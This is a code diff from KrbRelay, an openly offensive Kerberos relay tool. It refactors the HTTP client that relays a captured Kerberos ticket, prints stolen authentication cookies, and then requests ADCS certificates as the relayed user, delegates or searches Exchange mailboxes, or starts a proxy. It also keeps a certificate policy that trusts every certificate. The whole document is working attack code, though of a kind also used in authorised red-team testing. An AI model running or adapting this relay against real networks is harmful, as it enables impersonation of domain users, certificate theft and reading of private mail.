@@ -13,19 +13,22 @@ namespace KrbRelay.Clients
         public static void Connect()
         {
             string endpoint = "";
-            if (!string.IsNullOrEmpty(attacks["endpoint"]))
+            if (!string.IsNullOrEmpty(State.attacks["endpoint"]))
             {
-                endpoint = attacks["endpoint"].TrimStart('/');
+                endpoint = State.attacks["endpoint"].TrimStart('/');
             }
 
             HttpResponseMessage result;
-            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));
+            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(State.ticket));
 
             using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
             {
                 message.Headers.Add("Authorization", cookie);
                 message.Headers.Add("Connection", "keep-alive");
-                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
+                message.Headers.Add(
+                    "User-Agent",
+                    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
+                );
                 result = httpClient.SendAsync(message).Result;
             }
 
@@ -40,38 +43,54 @@ namespace KrbRelay.Clients
                     if (h.Key == "Set-Cookie")
                     {
                         cookies = h.Value;
-                        Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
+                        Console.WriteLine(
+                            "[*] Authentication Cookie;\n" + string.Join(";", h.Value)
+                        );
                     }
                 }
 
                 try
                 {
-                    if (attacks.Keys.Contains("proxy"))
+                    if (State.attacks.Keys.Contains("proxy"))
                     {
-                        Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
+                        Attacks.Http.ProxyServer.Start(
+                            httpClient,
+                            httpClient.BaseAddress.ToString()
+                        );
                     }
 
-                    if (attacks.Keys.Contains("adcs"))
+                    if (State.attacks.Keys.Contains("adcs"))
                     {
-                        Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
+                        Attacks.Http.ADCS.requestCertificate(
+                            httpClient,
+                            State.relayedUser,
+                            State.relayedUserDomain,
+                            State.attacks["adcs"]
+                        );
                     }
 
-                    if (attacks.Keys.Contains("ews-delegate"))
+                    if (State.attacks.Keys.Contains("ews-delegate"))
                     {
-                        Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
+                        Attacks.Http.EWS.delegateMailbox(
+                            httpClient,
+                            State.relayedUser,
+                            State.attacks["ews-delegate"]
+                        );
                     }
 
-                    if (attacks.Keys.Contains("ews-search"))
+                    if (State.attacks.Keys.Contains("ews-search"))
                     {
-                        Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
+                        Attacks.Http.EWS.readMailbox(
+                            httpClient,
+                            "inbox",
+                            State.attacks["ews-search"]
+                        );
                     }
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine("[-] {0}", e);
                 }
-
-                Environment.Exit(0);
             }
             else
             {
@@ -80,8 +99,9 @@ namespace KrbRelay.Clients
                     //Console.WriteLine(header.Key);
                     if (header.Key == "WWW-Authenticate")
                     {
-                        apRep1 = Convert.FromBase64String(header.Value.First().Replace("Negotiate ", ""));
-                        Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                        State.UpdateApRep1(Convert.FromBase64String(
+                            header.Value.First().Replace("Negotiate ", "")
+                        ));
                     }
                 }
             }
@@ -90,16 +110,24 @@ namespace KrbRelay.Clients
 
     internal class TrustAll : ICertificatePolicy
     {
-        public TrustAll()
-        {
-        }
+        public TrustAll() { }
 
-        public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem)
+        public bool CheckValidationResult(
+            ServicePoint srvPoint,
+            X509Certificate certificate,
+            WebRequest request,
+            int certificateProblem
+        )
         {
             return true;
         }
 
-        public bool CheckValidationResult(ServicePoint srvPoint, System.Security.Cryptography.X509Certificates.X509Certificate certificate, WebRequest request, int certificateProblem)
+        public bool CheckValidationResult(
+            ServicePoint srvPoint,
+            System.Security.Cryptography.X509Certificates.X509Certificate certificate,
+            WebRequest request,
+            int certificateProblem
+        )
         {
             return true;
         }
